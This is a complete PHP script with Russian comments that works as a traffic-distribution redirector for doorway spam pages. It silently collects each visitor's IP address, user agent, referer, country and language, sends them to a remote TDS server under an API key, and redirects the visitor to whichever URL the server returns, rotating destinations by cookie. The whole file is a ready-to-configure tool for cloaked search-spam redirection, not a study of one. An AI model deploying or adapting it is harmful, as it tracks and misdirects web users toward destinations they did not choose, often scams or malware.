<?php
@ini_set('display_errors', 0);
@error_reporting(0);
$z_id = 'dwl';//ID группы
$z_key_api_host = 'LmRe4q';//API ключ
$z_url = 'http://tds.com/?api=';//ссылка на TDS (замените только домен)
$z_cf_ip = 0;//определять IP посетителя по $_SERVER["HTTP_CF_CONNECTING_IP"] (0/1)
$z_get = 'q';//название GET переменной (http://doorway.com/go.php?q=keyword)
$z_out_reserved = 'http://site.com/[KEY]';//резервный URL, можно использовать макрос [KEY]
$z_rotator = 1;//включить ротатор и разрешить установку cookies (0/1)
$z_n_cookies = 'md5(host)';//название cookies для посетителей
$z_t_cookies = 3600;//время жизни cookies в секундах
$z_m_cookies = 0;//считать Expires от LastAccessed или от CreationTime (0/1)
$z_connect = 1;//тип соединения, file_get_contents или curl (0/1)
$z_timeout = 10;//таймаут соединения в секундах (только для curl)
/*Ниже ничего не изменяйте*/
$z_empty = '-';
if(!empty($_GET[$z_get])){
	$z_key = $_GET[$z_get];
}
else{
	$z_key ='';
}
$z_useragent = $z_empty;
if(!empty($_SERVER['HTTP_USER_AGENT'])){
	$z_useragent = $_SERVER['HTTP_USER_AGENT'];
}
$z_referer = $z_empty;
$z_se = $z_empty;
if(!empty($_SERVER['HTTP_REFERER'])){
	$z_referer  = $_SERVER['HTTP_REFERER'];
	if(stristr($z_referer, 'google')){$z_se = 'google';}
	if(stristr($z_referer, 'yandex')){$z_se = 'yandex';}
	if(stristr($z_referer, 'mail.ru')){$z_se = 'mail';}
	if(stristr($z_referer, 'yahoo')){$z_se = 'yahoo';}
	if(stristr($z_referer, 'bing')){$z_se = 'bing';}
	if(empty($z_se)){$z_se = $z_empty;}
}
$z_cf_country = $z_empty;
if(!empty($_SERVER["HTTP_CF_IPCOUNTRY"])){
	$z_cf_country = strtolower($_SERVER["HTTP_CF_IPCOUNTRY"]);
}
if($z_cf_ip == 1 && !empty($_SERVER["HTTP_CF_CONNECTING_IP"])){
	$z_ipuser = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
if($z_cf_ip == 0 || empty($z_ipuser)){
	if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
		if(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ".") > 0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ",") > 0){
			$z_ip = explode(",", $_SERVER['HTTP_X_FORWARDED_FOR']);
			$z_ipuser = trim($z_ip[0]);
		}
		elseif(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ".") > 0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ",") === false){
			if(empty($z_ip_serv_seodor)){
				$z_ipuser = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
			}
		}
	}
	if(empty($z_ipuser)){
		$z_ipuser = trim($_SERVER['REMOTE_ADDR']);
	}
}
if(!filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
	$z_ipuser = $z_empty;
}
$z_lang = $z_empty;
if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
	$z_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
}
$z_domain = $_SERVER['HTTP_HOST'];
$z_page = $_SERVER['REQUEST_URI'];
$z_uniq = 'yes';
if($z_rotator == 1){
	$z_t_cookies = time() + $z_t_cookies;
	$z_n_cookies_exp = md5($z_domain.'_exp');
	if(!isset($_COOKIE[$z_n_cookies])){
		SetCookie($z_n_cookies, 0, $z_t_cookies, '/');
		$z_counter = 0;
		$z_uniq = 'yes';
		if($z_m_cookies == 1){
			SetCookie($z_n_cookies_exp, $z_t_cookies, $z_t_cookies, '/');
		}
	}
	else{
		$z_counter = $_COOKIE[$z_n_cookies] + 1;
		if($z_m_cookies == 0){
			SetCookie($z_n_cookies, $z_counter, $z_t_cookies, '/');
		}
		if($z_m_cookies == 1){
			if(isset($_COOKIE[$z_n_cookies_exp])){
				$z_t_cookies = $_COOKIE[$z_n_cookies_exp];
			}
			SetCookie($z_n_cookies, $z_counter, $z_t_cookies, '/');
		}
		$z_uniq = 'no';
	}
}
if(empty($z_key)){$z_key = '';}
$z_request = array();
$z_request['key_api'] = $z_key_api_host;
$z_request['id'] = $z_id;
$z_request['ip'] = $z_ipuser;
$z_request['referer'] = $z_referer;
$z_request['useragent'] = $z_useragent;
$z_request['se'] = $z_se;
$z_request['lang'] = $z_lang;
$z_request['uniq'] = $z_uniq;
$z_request['key'] = urlencode($z_key);
$z_request['domain'] = $z_domain;
$z_request['page'] = $z_page;
$z_request['cf_country'] = $z_cf_country;
$z_request['par_1'] = '';
$z_request['par_2'] = '';
$z_request['par_3'] = '';
$z_request['par_4'] = '';
$z_request['par_5'] = '';
$z_request = $z_url.base64_encode(serialize($z_request));
if($z_connect == 0){
	$z_response = @file_get_contents($z_request);
}
else{
	$z_ch = curl_init();
	curl_setopt($z_ch, CURLOPT_TIMEOUT, $z_timeout);
	curl_setopt($z_ch, CURLOPT_URL, $z_request);
	curl_setopt($z_ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($z_ch, CURLOPT_FOLLOWLOCATION, 1);
	$z_response = curl_exec($z_ch);
	curl_close($z_ch);
}
$z_response = @unserialize($z_response);
if(is_array($z_response)){
	$z_response = trim(html_entity_decode($z_response[0], ENT_QUOTES, 'UTF-8'));
	if(stristr($z_response, '|||') && $z_rotator == 1){
		$z_out_ex = explode('|||', html_entity_decode($z_response, ENT_QUOTES, 'UTF-8'));
		if(isset($z_out_ex[$z_counter])){
			$z_test = trim($z_out_ex[$z_counter]);
		}
		if(!empty($z_test)){
			$z_out = trim($z_out_ex[$z_counter]);
		}
		else{
			$z_out = trim($z_out_ex[0]);
			SetCookie($z_n_cookies, 0, time() + $z_t_cookies, '/');
			$z_counter = 0;
		}
	}
	else{
		if(stristr($z_response, '|||')){
			$z_out_ex = explode('|||', html_entity_decode($z_response, ENT_QUOTES, 'UTF-8'));
			$z_out = trim($z_out_ex[0]);
		}
		else{
			$z_out = trim(html_entity_decode($z_response, ENT_QUOTES, 'UTF-8'));
		}
	}
}
if(empty($z_out)){
	$z_out = $z_out_reserved;
	if(stristr($z_out, '[KEY]')){
		$z_key = urlencode($z_key);
		$z_out = str_ireplace('[KEY]', $z_key, $z_out);
	}
}
header("Location: $z_out");
exit();
/*
Если ротатор выключен, аутом будет первый URL, уникальность "по cookies" работать не будет.
*/
?>